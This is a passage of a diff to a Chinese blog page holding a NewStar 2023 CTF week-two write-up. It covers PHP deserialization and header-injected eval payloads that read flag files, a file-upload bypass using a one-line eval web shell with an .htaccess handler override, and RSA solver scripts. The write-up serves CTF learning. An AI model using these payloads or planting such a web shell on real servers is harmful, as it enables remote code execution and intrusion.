 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$e</span> = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$e</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment"># 运行结果</span></span><br><span class="line">  O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>evil%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>cmd%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">22</span>ls%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231017143949315.png" alt="image-20231017143949315"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231017143949315.png"
+                      alt="image-20231017143949315"
+                ></p>
 <ol start="4">
 <li>发现当前目录只有<code>index.php</code>,于是查看根目录</li>
 </ol>
@@ -282,30 +423,70 @@
 
 <ol start="5">
 <li><p>需要注意的是运行结果中有 + 需要将+改成%20，得到根目录</p>
-<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231017144311370.png" alt="image-20231017144311370"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231017144311370.png"
+                      alt="image-20231017144311370"
+                ></p>
 </li>
 <li><p>找到可疑目录<code>th1s_1s_fffflllll4444aaaggggg</code>,但是cat被过滤，想办法绕过</p>
 </li>
 </ol>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&#x27;ca``t th1s_1s_fffflllll4444aaaggggg&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$e</span> = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$e</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 运行结果</span></span><br><span class="line"> O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>evil%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>cmd%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A36%<span class="number">3</span>A%<span class="number">22</span>ca%<span class="number">60</span>%<span class="number">60</span>t+%<span class="number">2</span>Fth1s_1s_fffflllll4444aaaggggg%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231017144727107.png" alt="image-20231017144727107"></p>
-<h3 id="Upload-again"><a href="#Upload-again" class="headerlink" title="Upload again!"></a>Upload again!</h3><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010094041762.png" alt="image-20231010094041762"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231017144727107.png"
+                      alt="image-20231017144727107"
+                ></p>
+<h3 id="Upload-again"><a href="#Upload-again" class="headerlink" title="Upload again!"></a>Upload again!</h3><p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010094041762.png"
+                      alt="image-20231010094041762"
+                ></p>
 <ol>
 <li><p>首先利用bp抓包试试，正常上传图片正常回显</p>
-<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010094343511.png" alt="image-20231010094343511"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010094343511.png"
+                      alt="image-20231010094343511"
+                ></p>
 </li>
 <li><p>将图片后缀更改为php，显示错误</p>
-<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010094430575.png" alt="image-20231010094430575"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010094430575.png"
+                      alt="image-20231010094430575"
+                ></p>
 </li>
 <li><p>试着上传图片马，还是能检测出来</p>
-<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010094608740.png" alt="image-20231010094608740"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010094608740.png"
+                      alt="image-20231010094608740"
+                ></p>
 </li>
 <li><p>猜测可能是检测了后缀，以及检测图片内容中是否包含了php代码，试着去掉php代码</p>
-<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010094944563.png" alt="image-20231010094944563"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010094944563.png"
+                      alt="image-20231010094944563"
+                ></p>
 </li>
 <li><p>仍然被检测出来，现在猜测可能是由于<code>&lt;? ?&gt;</code>，去掉<code>&lt;? ?&gt;</code>,保留php中的代码，发现能成功上传</p>
-<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010095437194.png" alt="image-20231010095437194"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010095437194.png"
+                      alt="image-20231010095437194"
+                ></p>
 </li>
 <li><p><strong>利用script代替<? 、?>标签</strong></p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;@<span class="built_in">eval</span>($_POST[<span class="string">&#x27;111111&#x27;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
@@ -314,19 +495,39 @@
 <li><p>但是，图片中的php代码不能被解析，尝试先上传<code>.htaccess</code>文件，在上传对应图片，这样图片中的php代码就能被解析</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;evil.png&quot;&gt;</span><br><span class="line"></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"></span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure></li>
 </ol>
-<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010100336815.png" alt="image-20231010100336815"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010100336815.png"
+                      alt="image-20231010100336815"
+                ></p>
 <ol start="8">
 <li><p>接着上传 <code>evil.png</code>文件</p>
-<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010100505136.png" alt="image-20231010100505136"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010100505136.png"
+                      alt="image-20231010100505136"
+                ></p>
 </li>
 <li><p>接着用蚁剑连接，查询可疑文件</p>
-<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010101448421.png" alt="image-20231010101448421"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010101448421.png"
+                      alt="image-20231010101448421"
+                ></p>
 </li>
 </ol>
 <p><code>flag&#123;4366f19d-3ec5-4dec-801f-113d944e370a&#125;</code></p>
 <h3 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!!C!!E!!"></a>R!!C!!E!!</h3><p>根据提示有信息泄露，可以使用dirsearch扫，扫出了 &#x2F;.git</p>
 <p>使用githack工具获取源码</p>
-<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231025154033987.png" alt="image-20231025154033987"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231025154033987.png"
+                      alt="image-20231025154033987"
+                ></p>
 <p>bo0g1pop.php源码：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -338,25 +539,45 @@
 <p>官方payload（使用 bp 发送的请求）：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /bo0g1pop.php?star=<span class="built_in">eval</span>(pos(array_reverse(getallheaders()))); HTTP/1.1</span><br><span class="line">Host: faf83665-1a88-473a-b765-ddd33c6cf370.node4.buuoj.cn:81</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflateConnection: close</span><br><span class="line">X-Forwarder-Proto: system(<span class="string">&#x27;cat /f*&#x27;</span>);</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
 
-<p>有一篇writeup写的很好：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/EddieMurphy-blogs/articles/17752305.html">https://www.cnblogs.com/EddieMurphy-blogs/articles/17752305.html</a></p>
+<p>有一篇writeup写的很好：<a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/EddieMurphy-blogs/articles/17752305.html" >https://www.cnblogs.com/EddieMurphy-blogs/articles/17752305.html<i class="fas fa-external-link-alt"></i></a></p>
 <h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="滴啤"><a href="#滴啤" class="headerlink" title="滴啤"></a>滴啤</h3><ol>
 <li><p>根据提示 应该考察的是RSA <code>dp泄露</code></p>
-<p><img src="http://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010151245060.png" alt="image-20231010151245060"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="http://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010151245060.png"
+                      alt="image-20231010151245060"
+                ></p>
 </li>
 <li><p>看到注释的三条数据，大概率就是dp泄露，编写dp泄露脚本</p>
 </li>
 </ol>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">n= <span class="number">93172788492926438327710592564562854206438712390394636149385608321800134934361353794206624031396988124455847768883785503795521389178814791213054124361007887496351504099772757164211666778414800698976335767027868761735533195880182982358937211282541379697714874313863354097646233575265223978310932841461535936931</span></span><br><span class="line">e= <span class="number">65537</span></span><br><span class="line">c= <span class="number">52777705692327501332528487168340175436832109866218597778822262268417075157567880409483079452903528883040715097136293765188858187142103081639134055997552543213589467751037524482578093572244313928030341356359989531451789166815462417484822009937089058352982739611755717666799278271494933382716633553199739292089</span></span><br><span class="line">dp= <span class="number">307467153394842898333761625034462907680907310539113349710634557900919735848784017007186630645110812431448648273172817619775466967145608769260573615221635</span></span><br><span class="line"></span><br><span class="line">p=gmpy2.gcd(<span class="built_in">pow</span>(<span class="number">2</span>,e*dp,n)-<span class="number">2</span>,n)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):</span><br><span class="line">    p = (dp * e - <span class="number">1</span>) // i + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> n % p == <span class="number">0</span>:</span><br><span class="line">        q = n // p</span><br><span class="line">        <span class="built_in">print</span>(q)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi_n)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">flag = libnum.n2s(<span class="built_in">int</span>(m))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010151350788.png" alt="image-20231010151350788"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010151350788.png"
+                      alt="image-20231010151350788"
+                ></p>
 <p><code>flag&#123;cd5ff82d-989c-4fbf-9543-3f98ab567546&#125;</code></p>
 <h3 id="不止一个pi"><a href="#不止一个pi" class="headerlink" title="不止一个pi"></a>不止一个pi</h3><ol>
 <li>同样根据题目和给出的python代码，猜测仍然是RSA中的 <code>e和phi不互素</code>，即是 存在两个或多个模数<strong>且<code>gcd(N1,N2)!=1</code></strong></li>
 </ol>
-<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010152809765.png" alt="image-20231010152809765"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010152809765.png"
+                      alt="image-20231010152809765"
+                ></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">p = <span class="number">171790960371317244087615913047696670778115765201883835525456016207966048658582417842936925149582378305610304505530997833147251832289276125084339614808085356814202236463900384335878760177630501950384919794386619363394169016560485152083893183420911295712446925318391793822371390439655160077212739260871923935217</span></span><br><span class="line">q = <span class="number">115478867870347527660680329271012852043845868401928361076102779938370270670897498759391844282137149013845956612257534640259997979275610235395706473965973203544920469416283181677660262509481282536465796731401967694683575843183509430017972506752901270887444490905891490955975762524187534052478173966117471143713</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">4459183928324369762397671605317600157512712503694330767938490496225669985050002776253470841193156951087663107866714426230222002399666306287642591077990897883174134404896800482234781531592939043551832049756571987010173667074168282355520711905659013076509353523088583347373358980842707686611157050425584598825151399870268083867269912139634929397957514376826145870752116583185351576051776627208882377413433140577461314504762388617595282085102271510792305560608934353515552201553674287954987323321512852114353266359364282603487098916608302944694600227628787791876600901537888110093703612414836676571562487005330299996908873589228072982641114844761980143047920770114535924959765518365614709272297666231481655857243004072049094078525569460293381479558148506346966064906164209362147313371962567040047084516510135054571080612077333228195608109065475260832580192321853906138811139036658485688320161530131239854003996457871663456850196483520239675981391047452381998620386899101820782421605287708727667663038905378115235163773867508258208867367314108701855709002634592329976912239956212490788262396106230191754680813790425433763427315230330459349320412354189010684525105318610102936715203529222491642807382215023468936755584632849348996666528981269240867612068382243822300418856599418223875522408986596925018975565057696218423036459144392625166761522424721268971676010427096379610266649911939139451989246194525553533699831110568146220347603627745407449761792135898110139743498767543521297525802809254842518002190381508964357001211353997061417710783337</span></span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">t = gmpy2.gcd(e, phi)</span><br><span class="line">t1 = e // t</span><br><span class="line">dt1 = gmpy2.invert(t1, phi)</span><br><span class="line">mt1 = <span class="built_in">pow</span>(c, dt1, n)</span><br><span class="line"><span class="built_in">print</span>(mt1)</span><br><span class="line">s, m = gmpy2.iroot(mt1, t)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(s)))</span><br></pre></td></tr></table></figure>
 
-<p><img src="http://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010152850074.png" alt="image-20231010152850074"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="http://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010152850074.png"
+                      alt="image-20231010152850074"
+                ></p>
 <p><code>flag&#123;bu_zhi_yige_p1dsaf&#125;</code></p>
 <h3 id="halfcandecode"><a href="#halfcandecode" class="headerlink" title="halfcandecode"></a>halfcandecode</h3><p>out.txt：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">113021375625152132650190712599981988437204747209058903684387817901743950240396649608148052382567758817980625681440722581705541952712770770893410244646286485083142929097056891857721084849003860977390188797648441292666187101736281034814846427200984062294497391471725496839508139522313741138689378936638290593969</span><br><span class="line">43054766235531111372528859352567995977948625157340673795619075138183683929001986100833866227688081563803862977936680822407924897357491201356413493645515962458854570731176193055259779564051991277092941379392700065150286936607784073707448630150405898083000157174927733260198355690620639487049523345380364948649</span><br><span class="line">4a8a08f09d37b73795649038408b5f33</span><br><span class="line">03c7c0ace395d80182db07ae2c30f034</span><br><span class="line">e1671797c52e15f763380b45e841ec32</span><br><span class="line">b14a7b8059d9c055954c92674ce60032</span><br><span class="line">e358efa489f58062f10dd7316b65649e</span><br><span class="line">cfcd208495d565ef66e7dff9f98764da</span><br><span class="line">b14a7b8059d9c055954c92674ce60032</span><br><span class="line">8fa14cdd754f91cc6554c9e71929cce7</span><br><span class="line">0cc175b9c0f1b6a831c399e269772661</span><br><span class="line">4a8a08f09d37b73795649038408b5f33</span><br><span class="line">e358efa489f58062f10dd7316b65649e</span><br><span class="line">cfcd208495d565ef66e7dff9f98764da</span><br><span class="line">4b43b0aee35624cd95b910189b3dc231</span><br><span class="line">cbb184dd8e05c9709e5dcaedaa0495cf</span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -376,263 +597,562 @@
 <p>这是关于RSA-CRT(中国剩余定理)</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m2 = <span class="number">4816725107096625408335954912986735584642230604517017890897348901815741632668751378729851753037917164989698483856004115922538576470127778342121497852554884</span></span><br><span class="line">h = <span class="number">4180720137090447835816240697100630525624574275</span></span><br><span class="line">q = <span class="number">7325294399829061614283539157853382831627804571792179477843187097003503398904074108324900986946175657737035770512213530293277111992799331251231223710406931</span></span><br><span class="line"></span><br><span class="line">m = m2+h*q</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
 
-<p><img src="http://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231025151826920.png" alt="image-20231025151826920"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="http://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231025151826920.png"
+                      alt="image-20231025151826920"
+                ></p>
 
-  </div>
-  <div>    
-    <ul class="post-copyright">
-       <li class="post-copyright-link">
-        <strong>本文作者：</strong>
-        <a href="/">iahzl</a>
-      </li>
-      <li class="post-copyright-link">
-        <strong>本文标题：</strong>
-        <a href="{{ url_for(config.permalink) }}">
-    
-        <a class="" href="/NewStar-WriteUp-Week2/">NewStar 2023 Week2</a>
-    
+                </div>
+
+                
+                        
+<div class="article-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="post-title border-box text-ellipsis">
+                NewStar 2023 Week2
+            </div>
+
+            <div class="post-link border-box text-ellipsis">
+                NewStar-WriteUp-Week2/
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="post-author bottom-item">
+                <div class="type">
+                    Author
+                </div>
+                <div class="content">S3a</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    Published
+                </div>
+                <div class="content">2023-10-16 15:29</div>
+            </div>
 
 
-</a>
-      </li>
-      <li class="post-copyright-link">
-        <strong>本文链接：</strong>
-        <a title="NewStar 2023 Week2">https://iahzl.github.io/NewStar-WriteUp-Week2/</a>
-      </li>
-      <li class="post-copyright-license">
-        <strong>版权声明： </strong>
-        本文由 iahzl 原创，采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/deed.zh" title="Attribution-NonCommercial-NoDerivatives 4.0 International" rel="license" target="_blank">CC BY-NC-ND 4.0</a>, 转载请保留以上声明信息！
-      </li>
+            <div class="post-license bottom-item">
+                <div class="type">
+                    License
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed">
+                        <i class="fa-brands fa-creative-commons"></i>
+                        <i class="fa-brands fa-creative-commons-by"></i>
+                        <i class="fa-brands fa-creative-commons-nc"></i>
+                        <i class="fa-brands fa-creative-commons-sa"></i>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="Copy copyright info" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/ctf/">ctf</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/crypto/">crypto</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/web/">web</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                            <div class="post-share-container border-box">
+    <ul class="share-list-wrap border-box">
+        <li class="qq share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to QQ"
+        >
+            <i class="fa-brands fa-qq"></i>
+        </li>
+        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
+            data-tooltip-content="Share to WeChat"
+            data-tooltip-img-tip="Scan by WeChat"
+            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
+        >
+            <i class="fa-brands fa-weixin"></i>
+        </li>
+        <li class="weibo share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to WeiBo"
+        >
+            <i class="fa-brands fa-weibo"></i>
+        </li>
     </ul>
 </div>
-</article>
+
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="article-nav">
+                        
+                            <div class="article-prev">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/xray-webscan%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"
+                                   title="xray-webscan使用教程"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                      <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                            <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">xray-webscan使用教程</span>
+                                        <span class="post-nav-item">Prev posts</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="article-next">
+                                <a class="next"
+                                   rel="next"
+                                   href="/NewStar-2023/"
+                                   title="NewStar 2023 Week1"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">NewStar 2023 Week1</span>
+                                        <span class="post-nav-item">Next posts</span>
+                                    </span>
+                                            <span class="right arrow-icon flex-center">
+                                      <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+    <div class="comments-container border-box">
+        <div id="comments-anchor" class="comment-area-title border-box">
+            <i class="fas fa-comments"></i>&nbsp;Comments
+        </div>
+        <div class="comment-plugin-fail border-box">
+    <span class="fail-tip">Comment plugin failed to load</span>
+    <button class="reload keep-button">Click to reload</button>
+</div>
+<div class="comment-plugin-loading flex-center border-box">
+    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
+    <span class="load-tip">Loading comment plugin</span>
+</div>
+<script data-pjax>
+  window.KeepCommentPlugin = {}
+  window.KeepCommentPlugin.hideLoading = () => {
+    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
+    cplDom.style.display = 'none'
+  }
+  window.KeepCommentPlugin.loadFailHandle = () => {
+    window.KeepCommentPlugin.hideLoading()
+    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
+    cpfDom.style.display = 'flex'
+    cpfDom.querySelector('.reload').addEventListener('click', () => {
+      window.location.reload()
+    })
+  }
+</script>
+
+        
+            
+
+    <div class="valine-container">
+        <div id="vcomments"></div>
+        <script data-pjax
+                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"
+                async
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        ></script>
+        <script data-pjax
+                async
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        >
+          window.KeepCommentPlugin.initValine = () => {
+            const config = {
+              el: '#vcomments',
